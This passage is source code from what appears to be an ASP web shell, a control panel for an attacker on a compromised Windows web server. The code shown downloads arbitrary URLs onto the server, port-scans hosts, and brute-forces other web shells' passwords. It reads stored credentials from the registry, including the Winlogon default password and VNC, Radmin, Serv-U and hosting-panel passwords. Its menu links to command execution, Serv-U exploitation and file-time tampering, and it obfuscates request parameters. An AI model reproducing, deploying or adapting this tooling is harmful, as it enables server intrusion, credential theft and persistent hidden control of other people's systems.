			If regTest(ext,"^("&aspExt&")$") Then
				content=fsoRead(objFile.Path)
				strInclude=""
				For Each strObj In Split(shellObjLst,"|")
					If InStr(1,content,strObj,1)>0 Then
						doScanReport objFile,"Object with risk : <font color=""red"">"&strObj&"</font>"
						echoed=True
					End If
				Next
				For Each strFunc In Split(funcLst,"|")
					objName=getLeft(strFunc,";",True)
					funcs=getRight(strFunc,";")
					For Each subFunc In Split(funcs,",")
						If regTest(content,"\."&subFunc&"\b") Then
							doScanReport objFile,"Called object <font color=""red"">"&objName&"'s "&subFunc&"</font> Function"
							echoed=True
						End If
					Next
				Next
				If regTest(content,"Set\s*.*\s*=\s*server\s")Then
					doScanReport objFile,"Found Set xxx=Server"
					echoed=True
				End If
				If regTest(content,"server.(execute|Transfer)([ \t]*|\()[^""]\)")Then
					doScanReport objFile,"Found <font color=""red"">Server.Execute / Transfer()</font> Function"
					echoed=True
				End If
				If regTest(content,"\bLANGUAGE\s*=\s*[""]?\s*(vbscript|jscript|javascript)\.encode\b")Then
					doScanReport objFile,"<font color=""red"">Script encrypted</font>"
					echoed=True
				End If
				If regTest(content,"<script\s*(.|\n)*?runat\s*=\s*""?server""?(.|\n)*?>")Then
					doScanReport objFile,"Found <font color=""red"">"&htmlEnc("<script runat=""server"">")&"</font>"
					echoed=True
				End If
				If regTest(content,"[^\.]\bExecute\b")Then
					doScanReport objFile,"Found <font color=""red"">Execute()</font> Function"
					echoed=True
				End If
				If regTest(content,"[^\.]\bExecuteGlobal\b")Then
					doScanReport objFile,"Found <font color=""red"">ExecuteGlobal()</font> Function"
					echoed=True
				End If
				If getInc=1 Then strInclude=regExecute(content,"<!--\s*#include\s+(file|virtual)\s*=\s*.*-->",False)(0)
				If strInclude<>""Then
					strInclude=regExecute(strInclude,"[/\w]+\.[\w]+",False)(0)
					If strInclude=""Then 
						doScanReport objFile,"Can't get include file"
						echoed=True
					Else
						doScanReport objFile,"Included file <font color=""blue"">"&strInclude&"</font>"
						echoed=True
					End If
				End If
			End If
			If echoed Then
				echo"<hr>"
				Response.Flush()
			End If
		Next
		For Each objFolder In theFolder.SubFolders
			doScan(objFolder)
		Next
		chkerr(Err)
	End Sub
	Sub doScanReport(objFile,plus)
		echoLine"<li><u>"
		doSubHref "FsoFileExplorer","showEdit",doPathFormat(objFile.Path),objFile.Path,""
		echoLine"</u><font color=#9900FF>"&objFile.DateLastModIfied&"</font>-<font color=#009966>"&getTheSize(objFile.size)&"</font>-"&plus&"</li>"
		Response.Flush()
	End Sub

	Sub PageOtherTools()
		If Not isDebugMode Then On Error Resume Next
		If thePath=""Then thePath=aspPath
		Dim commPath,regPaths
		regPaths=regPath
		commPath=chkPath
		If regPaths=""Then regPaths=Replace("HKLM\SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName\ComputerName|HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoAdminLogon|HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultUserName|HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\DefaultPassword|HKLM\SYSTEM\CurrentControlSet\Services\Serv-U-Counters\Performance\Library|HKLM\SYSTEM\CurrentControlSet\Services\Serv-U\ImagePath|HKLM\SOFTWARE\Cat Soft\Serv-U\Domains\DomainList\DomainList|HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters\Parameter|HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters\Port|HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters\NTAuThenabled|HKLM\SYSTEM\RAdmin\v2.0\Server\Parameters\FilterIp|HKLM\SYSTEM\RAdmin\v2.0\Server\iplist\0|HKLM\SOFTWARE\ORL\WinVNC3\default\Password|HKLM\SOFTWARE\RealVNC\WinVNC4\Password|HKLM\SOFTWARE\hzhost\config\Settings\mysqlpass|HKLM\software\hzhost\config\Settings\mastersvrpass|HKLM\software\hzhost\config\Settings\sysdbpss","|",Chr(13)&Chr(10))

		If commPath=""Then commPath=Replace("x:\|x:\Program Files|x:\Program Files\Serv-u|x:\Program Files\RhinoSoft.com|x:\Program Files\Radmin|x:\Program Files\Mysql|x:\Program Files\mail|x:\Program Files\winwebmail|x:\Documents and Settings\All Users|x:\Documents and Settings\All Users\Documents|x:\Documents and Settings\All Users\Start Menu\Programs|x:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere|x:\Serv-U|x:\Radmin|x:\Mysql|x:\mail|x:\winwebmail|x:\soft|x:\tools|x:\windows\temp","|",Chr(13)&Chr(10))
		showTitle"Action Others"
		doForm True
		doHidden"subAct","downToServer"
		echoLine"<b>Download to server</b><br>"
		doTable"100%"
		doTr 1
		doTdInput"text","targetUrl","http://","80%","",""
		doTdSubmit"Download","20%"
		doTtr
		doTr 0
		doTdInput"text","thePath",thePath,"","",""
		echo"<td>"
		doChkBox"overWri",2,"Overwrite",""
		doTtr
		doTtable
		doFform
		echo"<hr>"
		doForm True
		doHidden"subAct","scanPort"
		echoLine"<b>Port scan</b><br>"
		doTable"100%"
		doTr 1
		doTd"Scan IP","20%"
		doTdInput"text","ipList","127.0.0.1","60%","",""
		doTdSubmit"Scan","20%"
		doTtr
		doTr 0
		doTd"Port List","20%"
		doTdInput"text","portList","21,23,80,1433,1521,3306,3389,4899,43958,65500","80%","",2
		doTtr
		doTtable
		doFform
		echo"<hr>"
		doForm True
		doHidden"subAct","crackShell"
		echoLine"<b>Mini shell crack</b><br>"
		doTable"100%"
		doTr 1
		doTd"Url","20%"
		doTdInput"text","targetUrl","http://","60%","",""
		doTdSubmit"Start","20%"
		doTtr
		doTr 0
		doTd"Dic","20%"	
		doTdInput"text","dicList","value,cmd,admin,fuck,123456,#,|,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,~,!,@,*,$,1,2,3,4,5,6,7,8,9,0","","",""
		echo"<td>"
		doSelect"shellenv","60px",""
		doOption"asp","asp"
		doOption"php","php"
		doSselect
		echo"</td>"
		doTtr
		doTtable
		doFform
		echo"<hr>"
		doForm True
		doHidden"subAct","chkFolder"
		echoLine"<b>Common path probe</b><br>"
		doTable"100%"
		doTr 1
		doTdText"chkPath",commPath,6
		doTdSubmit"Start","20%"
		doTtr
		doTtable
		doFform
		echo"<hr>"
		doForm True
		doTable"100%"
		doHidden"subAct","chkReg"
		echoLine"<b>Registry probe</b><br>"
		doTable"100%"
		doTr 1
		doTdText"regPath",regPaths,6
		doTdSubmit"Start","20%"
		doTtr
		doTtable
		doFform
		echo"<hr>"
		Select Case subAct
			Case"downToServer"
				echo"<hr>"
				doDownToServer()
			Case"chkReg"
				echo"<hr>"
				doChkReg()
			Case"scanPort"
				echo"<hr>"
				doScanPort()
			Case"crackShell"
				echo"<hr>"
				doCrackShell()
			Case"chkFolder"
				echo"<hr>"
				doChkFolder()
		End Select
	End Sub
	Sub doDownToServer()
		If Not isDebugMode Then On Error Resume Next
		Dim reFileName,tmpContent
		Set objStream=CreateObj("Adodb.Stream")
		reFileName=getRight(targetUrl,"/")
		If InStr(thePath,".")<1 Then thePath=thePath&"\"&reFileName
		objXml.Open"GET",targetUrl,False
		objXml.send
		dieErr(Err)
		If overWri<>2 Then
			overWri=1
		End If
		With objStream
			.Type=1
			.Mode=3
			.Open
			.Write objXml.ResponseBody
			.Position=0
			objStream.SavetoFile thePath,overWri
			.Close
		End With
		If Err Then
			chkerr(Err)
		Else
			echo"Download succeeded"
		End If
	End Sub
	Sub doChkReg()
		If Not isDebugMode Then On Error Resume Next
		Dim RegResult
		echo"Registry key detected will be shown below:<br>"
		doTable "100%"
		trId=1
		doTh
		doTd"<b>Key</b>",""
		doTd"<b>Value</b>",""
		doTtr
		For Each subPath In Split(regPath,Chr(13)&Chr(10))
			RegResult=ReadReg(subPath)
			If RegResult<>"" Then
				doTr trId
				doTd subPath,""
				doTd RegResult,""
				doTtr
				trIdAdd
			End If
		Next
		doTtable
	End Sub
	Function ReadReg(rpath)
		Dim regArray,regResult
		If Not isDebugMode Then On Error Resume Next
		regArray=objWs.RegRead(rpath)
		If IsArray(regArray)Then
			regResult=""
			For i=0 To UBound(regArray)
				If IsNumeric(regArray(i))Then
					If CInt(regArray(i))<16 Then
						RegResult=RegResult&"0"
					End If
					regResult=RegResult&CStr(Hex(CInt(regArray(i))))
				Else
					regResult=RegResult&regArray(i)
				End If
			Next
			ReadReg=regResult
		Else
			ReadReg=regArray
		End If
	End Function
	Sub doScanPort()
		If Not isDebugMode Then On Error Resume Next
		If Not regTest(ipList,"^((\d{1,3}\.){3}(\d{1,3}),)*(\d{1,3}\.){3}(\d{1,3})$")Then
			echo "Invalid IP format"
			doFin
		End If
		If Not regTest(portList,"^(\d{1,5},)*\d{1,5}$")Then
			echo "Invalid port format"
			doFin
		End If
		echo "Scanning...<br>"
		Response.Flush()
		For Each tmpip In Split(ipList,",")
			For Each tmpPort In Split(portList,",")
				doPortScan tmpip,tmpPort
			Next
		Next
	End Sub
	Sub doPortScan(targetip,portNum)
		On Error Resume Next
		Dim conn,connstr
		Set conn=CreateObj("ADODB.connection")
		connstr="Provider=SQLOLEDB.1;Data Source="&targetip&","&portNum&";User ID=lake2;Password=lake2;"
		conn.ConnectionTimeout=1
		conn.open connstr
		If Err Then
			If Err.number=-2147217843 or Err.number=-2147467259 Then
				If InStr(Err.description,"(Connect()).")>0 Then
					echo"<label>"&targetip&":"&portNum&"</label><label>close</label><br>"
				Else
					echo"<label>"&targetip&":"&portNum&"</label><label><font color=red>open</font></label><br>"
				End If
				Response.Flush()
			End If
		End If
	End Sub
	Sub doCrackShell()
		If Not isDebugMode Then On Error Resume Next
		echo"Cracking...<br>"
		Response.Flush()
		For Each strPass In Split(dicList,",")
			If shellenv="asp"Then
				strpam=UrlEnc(strPass)&"="&UrlEnc("response.write 98611")
			Else
				strpam=UrlEnc(strPass)&"="&UrlEnc("echo 98611;")
			End If
			If InStr(xmlGet(targetUrl&"?"&strpam,"POST"),"98611")>0 Then
				echo"Password is <font color=red>"&strPass&"</font> ^_^"
				doFin
			End If
		Next
		echo"Crack failed,RPWT?"
		chkerr(Err)
	End Sub
	Sub doChkFolder()
		If Not isDebugMode Then On Error Resume Next
		Dim subChkPath,spanId
		echo"Path detected will be shown below:<br>"
		chkPath=Replace(chkPath,"x:\","")
		spanId=1
		For Each drive In objFso.Drives
			For Each subPath In Split(chkPath,Chr(13)&Chr(10))
				subChkPath=drive.DriveLetter&":\"&subPath
				If objFso.FolderExists(subChkPath)Then
					doSpan spanId
					doSubHref "FsoFileExplorer","",doPathFormat(subChkPath),subChkPath,""
					echo"</span>"
					spanId=spanId+1
					If spanId=2 Then spanId=0
					rsTable.MoveNext
					Response.Flush()
				End If
			Next
		Next
		chkErr(Err)
	End Sub

	Sub PagedoLogout()
		Response.Cookies(cookiePass)=""
		Response.Redirect(pagePath&"?goaction="&showLogin)
	End Sub

	Sub showTitle(strTitle)
	%>
	<html>
		<head>
			<title><%=sversion%></title>
			<style type="text/css">
				body,td{font: 12px Arial,Tahoma;line-height: 16px;}
				.main{width:100%;padding:20px 20px 20px 20px;}
				.hidehref{font:12px Arial,Tahoma;color:#646464;}
				.showhref{font:12px Arial,Tahoma;color:#0099FF;}
				.input{font:12px Arial,Tahoma;background:#fff;height:20px;BORDER-WIDTH:1px;}
				.text{font:12px Arial,Tahoma;background:#fff;padding:1px;BORDER-WIDTH:1px;}
				.tdInput{font:12px Arial,Tahoma;background:#fff;padding:1px;height:20px;width:100%;BORDER-WIDTH:1px;}
				.tdText{font:12px Arial,Tahoma;background:#fff;padding:1px;width:100%;BORDER-WIDTH:1px;}
				.area{font:12px 'Courier New',Monospace;background:#fff;border: 1px solid #666;padding:2px;}
				a{color: #00f;text-decoration:underline;}
				a:hover{color: #f00;text-decoration:none;}
				.alt1Span{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ededed;padding:2px 10px 2px 5px;width:100%;height:28px}
				.alt0Span{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#fafafa;padding:2px 10px 2px 5px;width:100%;height:28px}
				.link td{border-top:1px solid #fff;border-bottom:1px solid #ccc;background:#e8e8e8;padding:5px 10px 5px 5px;}
				.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ededed;padding:2px 10px 2px 5px;height:28px}
				.alt0 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#fafafa;padding:2px 10px 2px 5px;height:28px}
				.focusTr td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ddddff;padding:2px 10px 2px 5px;height:28px}
				.head td{border-top:1px solid #ccc;border-bottom:1px solid #bbb;background:#e0e0e0;padding:5px 10px 5px 5px;font-weight:bold;}
				.headSpan{border-top:1px solid #fff;margin:2;background:#e0e0e0;width:100%;}
				form{margin:0;padding:0;}
				.bt{border-color:#b0b0b0;background:#3d3d3d;color:#ffffff;font:12px Arial,Tahoma;height:23px;padding:3px 5px 5px 5px;}
				h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
				ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
				u{text-decoration: none;color:#777;float:left;display:block;width:50%;margin-right:10px;}
				label{font:12px Arial,Tahoma;float:left;width:20%;}
				.lbl{font:12px Arial,Tahoma;float:none;width:auto;}
			</style>
			<script language="javascript">
				function showHideMe(obj){
					var sender=event.srcElement;
					if(obj.style.display=='none'){
						obj.style.display='';
						sender.className='showhref';
					}else{
						obj.style.display='none';
						sender.className='hidehref';
					}
				}
			</script>
			<script language="vbscript">
				Function dosubmit(strAction,strSubAct,Str)
					On Error Resume Next
					Dim renStr
					actForm.goaction.value=strAction
					actForm.subAct.value=strSubAct
					If(strAction="FsoFileExplorer"Or strAction="SaFileExplorer")And InStr(Str,":\")<1 And Str<>"" Then Str=nowPath.value&Str
					actForm.pubPam.value=secretEncode(Str)
					Select Case strSubAct
						Case"fileUpload"
							doEncode("upform")
							upform.submit()
						Case"safile"
							doEncode("saform")
							saform.submit()
						Case"cpFolder","mvFolder","mvFile","cpFile","rnFile","rnFolder","modIfyTime"
							Select Case strSubAct
								Case"mvFile","mvFolder"
									renStr=InputBox("Move to :","Move",Left(Str,InstrRev(Str,"\")))
								Case"cpFile","cpFolder"
									renStr=InputBox("Copy to :","Copy",Left(Str,InstrRev(Str,"\")))
								Case"rnFile","rnFolder"
									renStr=InputBox("Rename as :","Rename",Mid(Str,InstrRev(Str,"\")+1))
									If strSubAct="rnFile"Then
										Do While InStr(renStr,".")<1 And renStr<>""
											renStr=InputBox("Invalid file name format!","Rename","")
										Loop
									End If
								Case Else
									renStr=InputBox("ModIfy as :","ModIfy time","")
							End Select
							If renStr=""Then Exit Function
							actForm.pubPam.value=secretEncode(Str&"|"&renStr)
							actForm.submit()
						Case"delFile","delFolder"
							If Window.confirm("Delete it?Are you sure?")Then actForm.submit()
						Case Else
							actForm.submit()
					End Select
				End Function
				Function secretEncode(pamToEn)
					If Not <%=needEncode%> Or pamToEn=""Then
						secretEncode=pamToEn
						Exit Function
					End If
					Dim tt,tmpchr
					tt=""
					For i=1 To Len(pamToEn)
						tmpchr=Mid(pamToEn,i,1)
						If Asc(tmpchr)<128 And Asc(tmpchr)>0 Then
							tt=tt&Asc(tmpchr)+<%=encodeNum%>&"<%=encodeCut%>"
						Else
							tt=tt&tmpchr&"<%=encodeCut%>"
						End If
					Next
					secretEncode=Left(tt,Len(tt)-1)
				End Function
				Function doEncode(formId)
					On Error Resume Next
					Dim pamArr
					pamArr=Split("<%=pamtoEncode%>","|")
					For Each strPam In pamArr
						On Error Resume Next:Execute formId&"."&strPam&".value=secretEncode("&formId&"."&strPam&".value)"
					Next
				End Function
				Function dosqlsubmit(strSubAct,connStr,queryStr,strTable,intPage)
					sqlForm.subAct.value=strSubAct
					If strSubAct="delTable"Then
						If Not Window.confirm("Delete this table?Are you sure?")Then Exit Function
					End If
					If connStr<>""Then
						If InStr(1,connStr,"PROVIDER=",1)<1 Then connStr="<%=getJetStr("")%>"&nowPath.value&connStr
						sqlForm.connStr.value=connStr
					End If
					'If strTable<>""And <%=dbType<>"others"%> Then strTable="["&strTable&"]"
					sqlForm.connStr.value=secretEncode(sqlForm.connStr.value)
					sqlForm.queryStr.value=secretEncode(queryStr)
					sqlForm.strTable.value=secretEncode(strTable)
					sqlForm.intPage.value=intPage
					sqlForm.submit()
				End Function
				Function getconnStr(server,user,pass,db)
					form1.connStr.value="PROVIDER=SQLOLEDB;DATA SOURCE="&server&";UID="&user&";PWD="&pass&";DATABASE="&db&""
				End Function
				Function getAccStr(dbpath)
					form1.connStr.value="<%=getJetStr("")%>"&dbpath
				End Function
				Function decpams()
					'On Error Resume Next
					Dim subobj,regex
					Set regex=new RegExp
					regex.Global=True
					regex.IgnoreCase=True
					regex.MultiLine=True
					regex.Pattern="^((\d+|.)<%=encodeCut%>)+(\d+|.)$"
					For Each subForm In Document.Forms
						For Each subobj In subForm.Elements
							If InStr("|<%=pamtoEncode%>|","|"&subobj.id&"|")>0 And regEx.Test(subobj.value)Then subobj.value=secretDecode(subobj.value)
						Next
					Next
				End Function
				Function secretDecode(pamToDecode)
					If Not <%=needEncode%> Or pamToDecode=""Then
						secretDecode=pamToDecode
						Exit Function
					End If
					Dim dd,tmpArr
					dd=""
					tmpArr=Split(pamToDecode,"<%=encodeCut%>")
					For i=0 To UBound(tmpArr)
						If IsNumeric(tmpArr(i))Then
							dd=dd&Chr(CInt(tmpArr(i))-<%=encodeNum%>)
						Else
							dd=dd&tmpArr(i)
						End If
					Next
					secretDecode=dd
				End Function
			</script>
		</head>
		<body style="margin:0;table-layout:fixed; word-break:break-all;"bgcolor="#f9f9f9">
			<table width="100%"border="0"cellpadding="0"cellspacing="0">
				<tr class="head">
					<td style="width:30%"><br><%=getServerVariable("LOCAL_ADDR")&"("&serverName&")"%></td>
					<td align="center" style="width:40%"><br>
						<b><%doFont sversion,"#0099FF","3"%></b><br>
					</td>
					<td style="width:30%"align="right"><%=getAds()%></td>
				</tr>
		<form id="actForm"method="post"action="<%=pagePath%>">
			<input type="hidden" id="goaction" name="goaction" value="">
			<input type="hidden" id="subAct" name="subAct" value="">
			<input type="hidden" id="pubPam" name="pubPam" value="">
		</form>
		<form id="sqlForm"method="post"action="<%=pagePath%>">
			<input type="hidden" id="goaction" name="goaction" value="MsDataBase">
			<input type="hidden" id="subAct" name="subAct" value="">
			<input type="hidden" id="connStr" name="connStr" value="<%=connStr%>">
			<input type="hidden" id="queryStr" name="queryStr" value="">
			<input type="hidden" id="strTable" name="strTable" value="">
			<input type="hidden" id="intPage" name="intPage" value="">
		</form>
<%
		If logged Then
%>
	<tr class="link">
			<td colspan="3">
				<a href="javascript:dosubmit('infoAboutSrv','','');">Server Info</a> | 
				<a href="javascript:dosubmit('objOnSrv','','');">Object Info</a> | 
				<a href="javascript:dosubmit('userList','','');">User Info</a> | 
				<a href="javascript:dosubmit('CSInfo','','');">C-S Info</a> | 
				<a href="javascript:dosubmit('WsCmdRun','','');">WS Execute</a> | 
				<a href="javascript:dosubmit('FsoFileExplorer','','');">FSO File</a> | 
				<a href="javascript:dosubmit('SaFileExplorer','','');">App File</a> | 
				<a href="javascript:dosubmit('MsDataBase','','');">DataBase</a> | 
				<a href="javascript:dosubmit('AddToMdb','','');">File Packager</a> | 
				<a href="javascript:dosubmit('TxtSearcher','','');">File Searcher</a> | 
				<a href="javascript:dosubmit('ServUp','','');">ServU Exp</a> | 
				<a href="javascript:dosubmit('ScanShell','','');">Scan Shells</a> | 
				<a href="javascript:dosubmit('OtherTools','','');">Some Others...</a> | 
				<a href="javascript:dosubmit('Logout','','');">Logout</a> | 
				<a href="javascript:decpams();">Decode</a>
			</td>
	</tr>
<%
		End If
%></table><div class="main"><br>
<%
		echo"<b>"
		doFont strTitle&"&raquo;","#0099ff","2"
		echoLine"</b><br><br>"
	End Sub
	Sub show404()
		Dim sitedir
		sitedir=getLeft(getServerVariable("PATH_INFO"),"/",False)
		echo xmlGet("http://"&serverName&sitedir&"/"&fToPre&"?"&getServerVariable("QUERY_STRING"),"GET")
		Response.status=objXml.status
		response.End
	End Sub
	Sub getObjInfo(strObjInfo,strDscInfo)
		Dim objTmp
		If Not isDebugMode Then On Error Resume Next
		echo"<li><u>"&strObjInfo
		If strDscInfo<>""Then
			echo"(Object "&strDscInfo&")"
		End If
		echo"</u>"
		If Err Then Err.Clear
		Set objTmp=CreateObj(strObjInfo)
		If Err Then
			doFont htmlEnc("Disabled"),"red",""
		Else
			doFont htmlEnc("Enabled  "),"green",""
			echo"Version:"&objTmp.Version&";"
			echo"About:"&objTmp.About
		End If
		echo"</li>"
		If Err Then Err.Clear
		Set objTmp=Nothing
	End Sub
	Sub showUserInfo(strUser)
		Dim User,Flags,lastlog
		If Not isDebugMode Then On Error Resume Next
		Set User=getObj("WinNT://./"&strUser&",user")
		Flags=User.Get("UserFlags")
		lastlog=User.LastLogin
		doTr 0
		doTd"Description","20%"
		doTd User.Description,"80%"
		doTtr
		doTr 1
		doTd"Belong to",""
		doTd getItsGroup(strUser),""
		doTtr
		doTr 0
		doTd"Password expired","20%"
		doTd CBool(User.Get("PasswordExpired")),"80%"
		doTtr
		doTr 1
		doTd"Password never expire",""
		doTd cbool(Flags And&H10000),""
		doTtr
		doTr 0
		doTd"Can't change password",""
		doTd cbool(Flags And&H00040),""
		doTtr
		doTr 1
		doTd"Global-group account",""
		doTd cbool(Flags And&H100),""
		doTtr
		doTr 0
		doTd"Password length at least",""
		doTd User.PasswordMinimumLength,""
		doTtr
		doTr 1
		doTd"Password required",""
		doTd User.PasswordRequired,""
		doTtr
		doTr 0
		doTd"Account disabled",""
		doTd User.AccountDisabled,""
		doTtr
		doTr 1
		doTd"Account locked",""
		doTd User.IsAccountLocked,""
		doTtr
		doTr 0
		doTd"User profile",""
		doTd User.Profile,""
		doTtr
		doTr 1
		doTd"User loginscript",""
		doTd User.LoginScript,""
		doTtr
		doTr 0
		doTd"Home directory",""
		doTd User.HomeDirectory,""
		doTtr
		doTr 1
		doTd"Home drive",""
		doTd User.Get("HomeDirDrive"),""
		doTtr
		doTr 0
		doTd"Last login",""
		doTd lastlog,""
		doTtr
		If Err Then Err.Clear
	End Sub
	Function getItsGroup(strUser)
		Dim objUser,objGroup
		Set objUser=getObj("WinNT://./"&strUser&",user")
		For Each objGroup in objUser.Groups
			getItsGroup=getItsGroup&" "&objGroup.Name
		Next
	End Function
	Function FsoRead(thePath)
		Set objCountFile=objFso.OpenTextFile(thePath,1,True)
		FsoRead=Replace(objCountFile.ReadAll,Chr(0)," ")
		objCountFile.Close
		Set objCountFile=Nothing
	End Function
	Function streamLoadFromFile(thePath)
		If Not isDebugMode Then On Error Resume Next
		Set objStream=CreateObj("Adodb.Stream")
		With objStream
			.Type=2
			.Mode=3
			.Open
			.LoadFromFile thePath
			If subAct="utfEdit" Then
				.CharSet="utf-8"
			Else
				.CharSet=defaultChr
			End If
			.Position=2
			streamLoadFromFile=Replace(.ReadText(),Chr(0)," ")
			.Close
		End With
		Set objStream=Nothing
	End Function
	Sub streamSaveToFile(thePath,fileContent,stype)
		If Not isDebugMode Then On Error Resume Next
		Set objStream=CreateObj("Adodb.Stream")
		With objStream
			.Type=stype
			.Mode=3
			.Open
			If subAct="utfSave"Then
				.CharSet="utf-8"
			ElseIf subAct="Save"Then
				.CharSet=defaultChr
			End If
			If stype=2 Then
				.WriteText fileContent
			Else
				.Write fileContent
			End If
			objStream.SavetoFile thePath,2
			.Close
		End With
		Set objStream=Nothing
	End Sub
	Sub fsoSaveToFile(thePath,fileContent)
		Dim theFile
		Set theFile=objFso.OpenTextFile(thePath,2,True)
		theFile.Write fileContent
		theFile.Close
		Set theFile=Nothing
	End Sub
	Sub newOne()
		If Not isDebugMode Then On Error Resume Next
		If newOneType="file"Then
			thePath=thePath&"\"&newOneName
			Call objFso.CreateTextFile(thePath,False)
			showEdit
		Else
			objFso.CreateFolder(thePath&"\"&newOneName)
		End If
		If Err Then
			chkerr(Err)
		Else
			errMsgAdd"File/folder created"
		End If
	End Sub
	Sub renameOne()
		Dim tagName,objFolder,parPath,oriName
		If Not isDebugMode Then On Error Resume Next
		thePath=getLeft(pubPam,"|",False)
		tagName=getRight(pubPam,"|")
		If InStr(thePath,"\")<1 Then thePath=thePath&"\"
		Dim theFile,fileName,theFolder
		If thePath=""Or tagName=""Then
			errMsgAdd"Parameter wrong!"
			Exit Sub
		End If
		If strFileMethod="fso"Then
			If subAct="renamefolder"Then
				Set theFolder=objFso.GetFolder(thePath)
				theFolder.Name=tagName
				Set theFolder=Nothing
			Else
				Set theFile=objFso.GetFile(thePath)
				theFile.Name=tagName
				Set theFile=Nothing
			End If
		Else
			oriName=getRight(thePath,"\")
			parPath=getLeft(thePath,"\",False)
			Set objFolder=objSa.NameSpace(parPath)
			Set objItem=objFolder.ParseName(oriName)
			objItem.Name=tagName
		End If
		If Err Then
			chkerr(Err)
		Else
			errMsgAdd"Rename completed"
		End If
	End Sub
	Sub delOne()
		If Not isDebugMode Then On Error Resume Next
		If subAct="delFolder"Then
			Call objFso.DeleteFolder(thePath,True)
		Else
			Call objFso.DeleteFile(thePath,True)
		End If
		If Len(thePath)=2 Then thePath=thePath&"\"
		If Err Then
			chkerr(Err)
		Else
			errMsgAdd"File/folder deleted"
		End If
	End Sub
	Sub moveCopyOne()
		Dim oriPath,tagPath,objTargetFolder,objOriPath,objSa2
		If Not isDebugMode Then On Error Resume Next
		thePath=Left(pubPam,Instr(pubPam,"|")-1)
		tagPath=Mid(pubPam,InStr(pubPam,"|")+1)
		If thePath=""Or tagPath=""Then
			errMsgAdd"Parameter wrong!"
			Exit Sub
		End If
		Select Case subAct
			Case"cpFolder"
				Call objFso.CopyFolder(thePath,tagPath)
			Case"cpFile"
				Call objFso.CopyFile(thePath,tagPath)
			Case"mvFolder"
				Call objFso.MoveFolder(thePath,tagPath)
			Case"mvFile"
				echo thePath&"||"&tagPath
				Call objFso.MoveFile(thePath,tagPath)
		End Select
		If Err Then
			chkerr(Err)
		Else
			errMsgAdd"File/folder copyed/moved"
		End If
	End Sub
	Sub modIfyTime()
		Dim oItem,fileToModIfy,newDate,oFolder
		If Not isDebugMode Then On Error Resume Next
		thePath=Left(pubPam,Instr(pubPam,"|")-1)
		If Right(thePath,1)="\"And Len(thePath)>3 Then thePath=Left(thePath,Len(thePath)-1)
		fileToModIfy=getRight(thePath,"\")
		newDate=Mid(pubPam,Instr(pubPam,"|")+1)
		thePath=getLeft(thePath,"\",False)
		Set oFolder=objSa.NameSpace(thePath)
		Set oItem=oFolder.ParseName(fileToModIfy)
		If newDate<>""Then
			If IsDate(newDate) Then oItem.ModIfyDate=newDate
		End If
		If Err Then
			chkerr(Err)
		Else
			errMsgAdd"Time modIffied"
		End If
		Set oItem=Nothing
		Set oFolder=Nothing
	End Sub
	Sub downTheFile()
		Response.Clear
		If Not isDebugMode Then On Error Resume Next
		Dim fileName,fileContentType

		fileName=getRight(thePath,"\")
		Set objStream=CreateObj("Adodb.Stream")
		objStream.Open
		objStream.Type=1
		objStream.LoadFromFile(thePath)
		chkerr(Err)
		Session.CodePage=936
		Response.AddHeader"Content-Disposition","Attachment; Filename="&fileName
		Session.CodePage=65001
		Response.AddHeader"Content-Length",objStream.Size
		Response.ContentType="Application/Octet-Stream"
		Response.BinaryWrite objStream.Read
		Response.Flush()
		objStream.Close
		Set objStream=Nothing
	End Sub
	Class upload_5xsoft	
		Dim objForm,objFile
		Public Function Form(strForm)
			strForm=Lcase(strForm)
			If Not objForm.exists(strForm) Then
				Form=""
			Else
				Form=objForm(strForm)
			End If
		End Function
		Public Function File(strFile)
			If Not isDebugMode Then On Error Resume Next
			strFile=Lcase(strFile)
			If not objFile.exists(strFile) Then
				Set File=new FileInfo
			Else
				Set File=objFile(strFile)
			End If
		End Function
		Private Sub Class_Initialize
			If Not isDebugMode Then On Error Resume Next
			Dim RequestData,sStart,vbCrlf,sInfo,iInfoStart,iInfoEnd,tStream,iStart,theFile
			Dim IfileSize,sFilePath,sFileType,sFormValue,sFileName
			Dim IfindStart,IfindEnd
			Dim IformStart,IformEnd,sFormName
			Set objForm=CreateObj("Scripting.Dictionary")
			Set objFile=CreateObj("Scripting.Dictionary")
			If Request.TotalBytes<1 Then Exit Sub
			Set tStream=CreateObj("adodb.stream")
			Set objStream=CreateObj("adodb.stream")
			objStream.Type=1
			objStream.Mode=3
			objStream.Open
			objStream.Write Request.BinaryRead(Request.TotalBytes)
			objStream.Position=0
			RequestData=objStream.Read
			IformStart=1
			IformEnd=LenB(RequestData)
			vbCrlf=chrB(13)&chrB(10)
			sStart=MidB(RequestData,1,InStrB(IformStart,RequestData,vbCrlf)-1)
			iStart=LenB(sStart)
			IformStart=IformStart+iStart+1
			While(IformStart+10)<IformEnd 
			iInfoEnd=InStrB(IformStart,RequestData,vbCrlf & vbCrlf)+3
			tStream.Type=1
			tStream.Mode=3
			tStream.Open
			objStream.Position=IformStart
			objStream.CopyTo tStream,iInfoEnd-IformStart
			tStream.Position=0
			tStream.Type=2
			tStream.CharSet="gb2312"
			sInfo=tStream.ReadText
			tStream.Close
			IformStart=InStrB(iInfoEnd,RequestData,sStart)
			IfindStart=InStr(22,sInfo,"name=""",1)+6
			IfindEnd=InStr(IfindStart,sInfo,"""",1)
			sFormName=Lcase(Mid(sinfo,IfindStart,IfindEnd-IfindStart))
			If InStr(45,sInfo,"filename=""",1) > 0 Then
				Set theFile=new FileInfo
				IfindStart=InStr(IfindEnd,sInfo,"filename=""",1)+10
				IfindEnd=InStr(IfindStart,sInfo,"""",1)
				sFileName=Mid(sinfo,IfindStart,IfindEnd-IfindStart)
